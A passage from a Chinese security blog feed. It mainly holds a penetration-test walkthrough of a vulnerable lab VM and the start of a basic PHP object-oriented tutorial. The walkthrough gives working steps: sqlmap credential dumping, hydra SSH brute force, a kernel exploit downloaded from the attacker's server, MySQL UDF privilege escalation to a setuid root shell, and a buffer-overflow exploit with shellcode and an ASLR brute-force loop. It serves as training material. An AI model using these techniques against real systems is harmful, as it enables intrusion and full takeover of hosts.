alt="image-20240426143222105"></p><p><strong>发现只开放了一个22端口</strong></p><p><strong>尝试连接一下</strong></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>只有一个22端口，暂时做不了目录扫描</p><h2 id="ssh远程连接"><a href="#ssh远程连接" class="headerlink" title="ssh远程连接"></a>ssh远程连接</h2><p>连接22端口获得提示<br>knock ftiend to enter（敲门进入）<br>Easy as 1,2,3</p><p><img src="/../image/image-20240426143540944.png" alt="image-20240426143540944"></p><p>应该是在提示port_knocking（端口试探）的概要。<br>端口试探的主要目的是防止攻击者通过对端口扫描的方式对主机进行攻击。<br>端口试探是一种通过尝试连接，从外部打开原先关闭端口的方法。一旦收到正确顺序的尝试连接，防火墙就会打开一些特定的端口允许尝试连接的主机访问。<br>根据上面提示，我们尝试连接顺序连接1,2,3端口</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">knock是一个用于发送端口序列以触发特定行为的工具。它的工作原理是发送一系列的网络请求（称为<span class="string">&quot;击打&quot;</span>）到指定的主机和端口组合上。通过按照指定的顺序发送这些请求，可以触发防火墙规则、端口转发或其他网络设备上的特定行为。</span><br><span class="line"></span><br><span class="line">命令中的参数解释如下：</span><br><span class="line"></span><br><span class="line">&lt;主机&gt;：目标主机的名称或IP地址。</span><br><span class="line">&lt;端口[:协议]&gt;：指定要进行击打的端口和协议。可以指定一个或多个端口，以冒号分隔端口号和协议（TCP或UDP）。可以使用TCP或UDP协议，默认情况下使用TCP。</span><br><span class="line">其他选项的解释如下：</span><br><span class="line"></span><br><span class="line">-u, --udp：指定所有端口都使用UDP方式进行击打。</span><br><span class="line">-d, --delay &lt;t&gt;：在每个端口之间设置等待时间，以毫秒为单位。</span><br><span class="line">-4, --ipv4：强制使用IPv4地址。</span><br><span class="line">-6, --ipv6：强制使用IPv6地址。</span><br><span class="line">-v, --verbose：显示详细信息，提供更多的输出。</span><br><span class="line">-V, --version：显示knock的版本信息。</span><br><span class="line">-h, --<span class="built_in">help</span>：显示帮助信息。</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">knock -v 192.168.16.137 1 2 3</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240426144003787.png" alt="image-20240426144003787"></p><p>再次进行端口扫描</p><p>nmap -p- </p><p><img src="/../image/image-20240426144405510.png" alt="image-20240426144405510"></p><p>发现一个1337端口</p><p>这里看别的wp，发现了另一种写法</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 3 ) ; <span class="keyword">do</span> nmap 192.168.0.4 -p <span class="variable">$port</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure><ul><li><p>for port in $(seq 1 3)：这是一个for循环语句，它将变量port设置为从1到3的序列。这意味着循环将执行三次，每次将port设置为1、2和3。</p></li><li><p>do nmap 192.168.0.4 -p $port &amp;：在循环体中，执行nmap命令。192.168.0.4是目标主机的IP地址。-p $port指定要扫描的端口，变量$port将在每次循环时被替换为当前的端口值。&amp;符号表示在后台运行nmap命令，以便并行执行多个扫描。</p></li><li><p>done：循环结束的标记。</p></li></ul><h2 id="访问端口服务"><a href="#访问端口服务" class="headerlink" title="访问端口服务"></a>访问端口服务</h2><p><img src="/../image/image-20240426144646234.png" alt="image-20240426144646234"></p><p>只有一张图片，但提示了mordor，尝试访问一下这个目录</p><p><img src="/../image/image-20240426144733009.png" alt="image-20240426144733009"></p><p>又是只有一张图THE BLACK GATEIS TOO MAINSTREAM，查看源代码，发现一串加密的字符串</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;--&gt;</span></span><br></pre></td></tr></table></figure><p>方cmd5去跑一下，查询结果是</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!</span><br></pre></td></tr></table></figure><p>左边的一串也类似加密的字符串，再跑一遍</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">/978345210/index.php</span><br></pre></td></tr></table></figure><p>得到一个目录，尝试访问一下</p><p><img src="/../image/image-20240426145119047.png" alt="image-20240426145119047"></p><p>发现是一个登陆界面，直接用sqlmap试试，抓包，保存，-r</p><p><img src="/../image/image-20240426162217794.png" alt="image-20240426162217794"></p><p>发现不知道要跑多久，搜了下，换了个参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt -D Webapp --tables --threads=10 --batch</span><br></pre></td></tr></table></figure><p>爆出来个User表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt -D Webapp --dump -T Users --threads=10 --batch</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240426165336227.png" alt="image-20240426165336227"></p><p>发现了用户名和密码，明文存取，试试登陆，每一个好像都是一样图片，试试用这些账号远程登陆试试，可以用hydra，先把这些账号密码分别保存到txt文件中</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L username.txt -P password.txt ssh://192.168.174.151</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240426170701782.png" alt="image-20240426170701782"></p><p>发现第二个账号是可以登陆的，用它登陆上去试试</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="利用内核漏洞提取39166-c"><a href="#利用内核漏洞提取39166-c" class="headerlink" title="利用内核漏洞提取39166.c"></a>利用内核漏洞提取39166.c</h3><p><strong>uname -a</strong><br>Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU&#x2F;Linux</p><p>发现是ubuntu14.04，去找找有什么能够利用的漏洞，发现一个Ubuntu特权提升漏洞（CVE-2021-3493），去试试。操作不允许。。。看下wp用的是啥，在msf里找,带39166.c的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Ubuntu 14.04</span><br></pre></td></tr></table></figure><p>然后把他复制过来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit -m 39166.c</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240426222616464.png" alt="image-20240426222616464">然后在复制的地方搭建个一句话服务器</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m http.server 9966</span><br><span class="line">wget http://192.168.174.137:9966/39166.c</span><br><span class="line"><span class="comment">#然后</span></span><br><span class="line">gcc 39166.c -o 39166</span><br><span class="line">./39166</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240426222841696.png" alt="image-20240426222841696"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root</span><br><span class="line">cat Flat.txt</span><br><span class="line">“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”</span><br><span class="line">– Gandalf</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240426223158566.png" alt="image-20240426223158566"></p><h3 id="另一种方法-使用mysql提权"><a href="#另一种方法-使用mysql提权" class="headerlink" title="另一种方法:使用mysql提权"></a>另一种方法:使用mysql提权</h3><p>查看mysql 的版本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -aux | grep mysql</span><br><span class="line">mysql --version</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240426224959010.png" alt="image-20240426224959010"></p><p>查看mysql 数据库的root密码,这个可以去网站连接数据库的命令查看</p><p><img src="/../image/image-20240426225137108.png" alt="image-20240426225137108"></p><p>root:darkshadow</p><p>看看可以不以使用UDF提权，因为mysql是root用户运行的，如果我们提权成功，将获得root权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -uroot -pdarkshadow</span><br></pre></td></tr></table></figure><p>进入数据库后，看看secure_file_priv的配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出文件，此时无法提权</span><br><span class="line"> 当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出文件只能发生在 /tmp/ 目录下，此时也无法提权</span><br><span class="line"> 当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出文件做限制，此时可提权</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;secure%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240426225755198.png" alt="image-20240426225755198"></p><p>查看主机版本及数据库架构</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%compile%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240426225843760.png" alt="image-20240426225843760"></p><p>因数据库为i6886,要使用32位udf文件</p><p>查看plugin目录地址，此处为上传udf文件地址</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;plugin%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240426225930605.png" alt="image-20240426225930605"></p><p>&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;</p><p>可以在msf的&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql下，找到udf文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/metasploit-framework/data/exploits/mysql</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240426230405789.png" alt="image-20240426230405789"></p><p>将文件复制出来，因为是32位架构，所以使用lib_mysqludf_sys_32.so</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp lib_mysqludf_sys_32.so /root</span><br></pre></td></tr></table></figure><p>再搭一个一句话服务器9966端口，然后在靶机上下载</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.174.137:9966/lib_mysqludf_sys_32.so</span><br></pre></td></tr></table></figure><p>然后连接数据库，进入一个库，我这里用的是mysql</p><p>创建一个表，用来存储udf文件内容</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> foo(line blog);</span><br></pre></td></tr></table></figure><p>在MySQL中Blob是一个二进制的对象,Blob类型  最大能容纳65KB的</p><p><img src="/../image/image-20240426232307745.png" alt="image-20240426232307745"></p><p>将udf文件插入到temp表中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into foo(line) values (load_file(&#x27;/home/smeagol/lib_mysqludf_sys_32.so&#x27;));</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240426232545078.png" alt="image-20240426232545078"></p><p>在&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;目录下，新建一个udf32.so文件，将表中数据存入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select line from foo into dumpfile &quot;/usr/lib/mysql/plugin&quot;;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240426233332384.png" alt="image-20240426233332384"></p><p>将udf32.so文件导入数据库，定义一个函数名称sys_eval</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reate function sys_eval returns string soname &#x27;udf32.so&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240426233640781.png" alt="image-20240426233640781"></p><p>使用sys_eval函数，执行linux命令</p><p><img src="/../image/image-20240426233709376.png" alt="image-20240426233709376"></p><p>提权成功，给find命令赋予普通用户使用可以暂时获取root用户使用权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240426234038902.png" alt="image-20240426234038902"></p><p>通过find命令的 exec参数，获取root的shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find ./ 1.txt -<span class="built_in">exec</span> <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240426234322595.png" alt="image-20240426234322595"></p><h3 id="法三：缓冲区溢出提权"><a href="#法三：缓冲区溢出提权" class="headerlink" title="法三：缓冲区溢出提权."></a><strong>法三</strong>：<a href="https://www.freebuf.com/articles/network/325745.html">缓冲区溢出提权</a>.</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -lahR</span><br></pre></td></tr></table></figure><ul><li><strong>ls</strong> -a           <em># 显示当前目录中的所有文件和目录，包括隐藏文件</em></li><li><strong>ls</strong> -lh          <em># 以人类可读的方式显示当前目录中的文件和目录大小</em></li><li><strong>ls</strong> -R           <em># 递归显示当前目录中的所有文件和子目录</em></li></ul><p>学到一个批量看文件的命令</p><p><img src="/../image/image-20240427224437242.png" alt="image-20240427224437242"></p><p>这个文件是放在&#x2F;SECRET&#x2F;door3的file的文件,可以用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./file $(python -c &#x27;print&#x27; &quot;A&quot;*200&#x27;)</span><br></pre></td></tr></table></figure><p>测试</p><p><img src="/../image/image-20240427224801334.png" alt="image-20240427224801334"></p><p>这里使用gdb工具进行调试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb -q ./file</span><br></pre></td></tr></table></figure><p>既然在测试中200个字节就已经产生了溢出，那就先去生成一个不重复的两百的字节大小的字符串,这里用msf中的pattern_create.rb构造</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">locate pattern_</span><br><span class="line">cd /usr/share/metasploit-framework/tools/exploit </span><br><span class="line">./pattern_create.rb -l 200</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb</span><br><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb</span><br><span class="line">这两个脚本是专门用来作为缓冲区溢出查找偏移量的</span><br></pre></td></tr></table></figure><p>然后把这个字符串作为参数，放到gdb里run一下</p><p>走到这里和攻略不一样了，<a href="https://www.freebuf.com/vuls/343808.html">先换一种方法</a></p><p>在之前查看文件的基础上，可以发现间隔了几分钟后，我们再次查看，发现文件大小发生了变化</p><p><img src="/../image/image-20240427225956360.png" alt="image-20240427225956360"></p><p>一开始door1的file是7.2，door2的file是5.1，现在door1的是5.1，door2的是7.1</p><p>时使用ldd命令查看file ldd（查看依赖情况）</p><p><img src="/../image/image-20240427230232377.png" alt="image-20240427230232377"></p><p>这个是因为存在一个防护机制ASLR，我们查看ASLR设置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">或</span><br><span class="line">sysctl -a --pattern randomize</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240427230333280.png" alt="image-20240427230333280"></p><p>返回2</p><p>0 &#x3D; 关闭</p><p>1 &#x3D; 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（留坑，PIE会影响heap的随机化。。）</p><p>2 &#x3D; 全随机。除了1中所述，还有heap。</p><p>如果没有设置ASLR的话，ldd看到的值也都是固定的</p><p><strong>注意：这里的ASLR设置并不等于上文所说root权限下执行的那个py文件，switcher.py每三分钟变换一次值，相当于这是两道防护，让溢出的难度变得更大</strong></p><p><strong>绕过ASLR的一种方法是通过编写一个自动循环脚本（循环攻击，总会攻击到溢出的那个点）来强制堆栈，接下来要放入payload需要进行nop sled来爆破一个空间出来</strong></p><p>现在的情况就是，<strong>缓冲区溢出的文件随机，空间也随机</strong></p><p>对于溢出来说，有几个点：</p><ol><li>首先，溢出的点在哪里（偏移量&#x2F;溢出值）</li><li>溢出后，后面的空间有多大，放合适的恶意代码进去</li><li>绕过安全保护机制</li></ol><p>首先我们找到那个5.1k的file，然后把他搞到kali里面</p><p>我这里直接base64编码复制出来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base64 file</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240427230658503.png" alt="image-20240427230658503"></p><p>复制放到本地的一个文本中，并且复原成file,然后解密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat 1.txt | base64 -d &gt; file</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240427230953611.png" alt="image-20240427230953611"></p><p>此时在确定file是5.1k的情况下查看<strong>md5值</strong>，与kali里的进行对比</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5sum file</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240427231057051.png" alt="image-20240427231057051"></p><p>可以发现是一样的，这里也使用GDB进行分析，博主推荐两个插件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg和peda</span><br></pre></td></tr></table></figure><p>下面就是调试了</p><p>先授予权限并执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x file </span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240427231812796.png" alt="image-20240427231812796"></p><p>当把值加大后，回显段报错，用之前用的的方法生成个1000位值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./patern_create.rb -l 1000</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240427232203712.png" alt="image-20240427232203712"></p><p>再使用GDB执行值</p><p><img src="/../image/image-20240427233451400.png" alt="image-20240427233451400"></p><p><img src="/../image/image-20240427232335848.png" alt="image-20240427232335848"></p><p>然后发现之前方法可以继续下去了，可能是环境没调好</p><p>这两个工具是对应的，识别溢出点，上面脚本的找到错误点，下面的脚本找到位置</p><p>0x41376641 in ?? ()</p><p>查看到错误点在41376641</p><p><strong>分析错误点判断偏移量</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./pattern_offset.rb -q 41376641</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240427232550038.png" alt="image-20240427232550038"></p><p>得到偏移位置171</p><p><strong>尝试在偏移量171溢出后情况</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb$run $(python -c &#x27;print(&quot;A&quot; * 171 + &quot;B&quot; * 4)&#x27;)</span><br><span class="line">//我感觉明白前面不行是为什么了，我这里要加括号,python3print变成fun必须+括号</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240427233917963.png" alt="image-20240427233917963"></p><p>ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。ESP就是前面说的，始终指向栈顶，只要ESP指向变了，那么当前栈顶就变了。</p><p>EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。EBP存储着当前函数栈底的地址，栈底通常作为基址，我们可以通过栈底地址和偏移相加减来获取变量地址（很重要）。</p><p>EIP存储着下一条指令的地址，每执行一条指令，该寄存器变化一次。</p><p>可以说如果控制了EIP寄存器的内容，就控制了进程——我们让EIP指向哪里，CPU就会去执行哪里的指令。</p><p><strong>Nop空间测试ESP</strong></p><p>由于开启了ASLR机制，需要进行nop sled来爆破一个空间出来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run $(python -c &#x27;print(&quot;A&quot; * 171 + &quot;B&quot; * 4 + &quot;\x90&quot; * 2000)&#x27;)</span><br></pre></td></tr></table></figure><p>写入171个A之后，写入4个B，之后写入90</p><p><img src="/../image/image-20240427234217740.png" alt="image-20240427234217740"></p><p>我们成功的控制了eip中的内容，ESP就是我们溢出之后执行shellcode的地方</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x/s $esp</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240428104020602.png" alt="image-20240428104020602"></p><p>0xffffbf30这是nop sled的地址开始处，当ESP指向该地址处后，就会执行栈堆空间的payload获得shell</p><p>这里做到后面做错了。。。不能在本机跑。。。，内存都不一样了。。。</p><p>那我们往eip填写的数据需要是‘0xbfd37c50:’,记得倒序</p><p>看wp，作者在&#x2F;SECRET中执行的代码，这三次代码相同，但是每次esp地址却不同，甚至第三次他又没产生溢出漏洞，这就是我们上面讲的ASLR，他的地址在动态变化，防止我们制造出溢出漏洞，我想们需要饶过他</p><p>假设他每次地址都在随机变化，那我们只要指定一个地址填充到eip中，并不断执行构造溢出，那是不是他终究会出现随机到和我们指定的地址相同这种情况，时不时就会执行我们的shellcode</p><p>编写exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">buf=<span class="string">&quot;A&quot;</span>*<span class="number">171</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;</span></span><br><span class="line"><span class="comment">#for a in &#123;1..1000&#125;; do ./file $(python -c &#x27;print &quot;A&quot; * 171 + &quot;\x40\xee\xff\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#x27;); done</span></span><br><span class="line">shell=buf+<span class="string">&quot;\x40\xee\xff\xbf&quot;</span>+<span class="string">&quot;C&quot;</span>*<span class="number">20000</span>+<span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">        os.system(<span class="string">&#x27;./file&#x27;</span>+<span class="string">&quot; &quot;</span>+shell)</span><br></pre></td></tr></table></figure><p>由于esp地址前两位一直是bf所以我们前两位不变，剩下六位随便填，不要填\x00就行，他有特殊含义不能被正确识别</p><p>代码中被注释的是我从其他作者文章中复制过来的，可以直接在shell中执行</p><p>执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#for a in &#123;1..1000&#125;; do ./file $(python -c &#x27;print &quot;A&quot; * 171 + &quot;\x40\xee\xff\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#x27;); done</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240428163407372.png" alt="image-20240428163407372"></p><p>终于成了。。。。</p><p>这里有个问题是，root目录下有个switcher.py文件，会让产生缓冲区溢出的文件发生变化</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import os</span><br><span class="line">from random import randint</span><br><span class="line"></span><br><span class="line">targets= [&quot;/SECRET/door1/&quot;,&quot;/SECRET/door2/&quot;,&quot;/SECRET/door3/&quot;]</span><br><span class="line">for t in targets:</span><br><span class="line">   os.system(&quot;rm &quot;+t+&quot;*&quot;)</span><br><span class="line">   os.system(&quot;cp -p other &quot;+t)</span><br><span class="line">   os.system(&quot;cp -p &quot;+t+&quot;other &quot;+t+&quot;file&quot;)</span><br><span class="line">   os.system(&quot;rm &quot;+t+&quot;other&quot;)</span><br><span class="line"></span><br><span class="line">luckyDoor = randint(0,2)</span><br><span class="line">t=targets[luckyDoor]</span><br><span class="line">os.system(&quot;rm &quot;+t+&quot;*&quot;)</span><br><span class="line">os.system(&quot;cp -p buf &quot;+t)</span><br><span class="line">os.system(&quot;cp -p &quot;+t+&quot;buf &quot;+t+&quot;file&quot;)</span><br><span class="line">os.system(&quot;rm &quot;+t+&quot;buf&quot;)</span><br></pre></td></tr></table></figure><p>有时候不行的话，可以回去看下存在溢出的文件有没有发生变化</p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulhub </tag>
            
            <tag> 缓冲区溢出 </tag>
            
            <tag> udf提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化</title>
      <link href="/2024/04/18/php-SER-libs/"/>
      <url>/2024/04/18/php-SER-libs/</url>
      
        <content type="html"><![CDATA[<h1 id="php面像对象基本知识"><a href="#php面像对象基本知识" class="headerlink" title="php面像对象基本知识"></a>php面像对象基本知识</h1><p>对象的三个特征：对象的行为、对象的形态、对象的表示</p><p>类的定义：类是定义了一件事物的抽象特点，它将数据的形式以及这些数据<br>上的操作封装在一起。</p><p>对象是具有类类型的变量，是对类的实例。</p><p>内部构成：成员变量(属性) +成员函数（方法）</p><p>成员变量：定义在类内部的变量。该变量的值对外是不可见的但是可以通过成员函数访问在类被实例化为对象后，该变量即可成为对象的属性。</p><p>成员函数：定义在类的内部可用于访问对象的数据。</p><p>继承:继承性是子类自动共享父类数据结构和方法的机制，是类之间的一种关系。</p><p>在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把一个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</p><h2 id="类于对象"><a href="#类于对象" class="headerlink" title="类于对象"></a>类于对象</h2><h3 id="类的结构"><a href="#类的结构" class="headerlink" title="类的结构"></a>类的结构</h3><p>类:定义类名、定义成员变量(属性)、定义成员函数(方法)</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Class_Name</span></span>&#123;</span><br><span class="line">    <span class="comment">//成员变量声明</span></span><br><span class="line">    <span class="comment">//成员函数声明</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>创建一个类:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>&#123; <span class="comment">//定义类(类名)</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;<span class="comment">//生命成员变量</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"><span class="variable">$var1</span></span>) </span>&#123; <span class="comment">//声明成员方法</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name; <span class="comment">//使用预定义$this调用成员变量</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$var1</span>; <span class="comment">// 成员函数传参$var1可以直接调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="实例化和复制"><a href="#实例化和复制" class="headerlink" title="实例化和复制"></a>实例化和复制</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$sex</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"><span class="variable">$var1</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$var1</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cyj</span>= <span class="keyword">new</span> <span class="title function_ invoke__">hero</span>(); <span class="comment">//实例化类hero()为对象cyj</span></span><br><span class="line"><span class="variable">$cyj</span>-&gt;name=<span class="string">&#x27;chengyaojin&#x27;</span>;<span class="comment">//参数赋值</span></span><br><span class="line"><span class="variable">$cyj</span>-&gt;sex=<span class="string">&#x27;man&#x27;</span>;</span><br><span class="line"><span class="variable">$cyj</span>-&gt;<span class="title function_ invoke__">jineng</span>(<span class="string">&#x27;zuofan&#x27;</span>);<span class="comment">//嗲用函数</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$cyj</span>);<span class="comment">//打印对象</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="类的修饰符介绍"><a href="#类的修饰符介绍" class="headerlink" 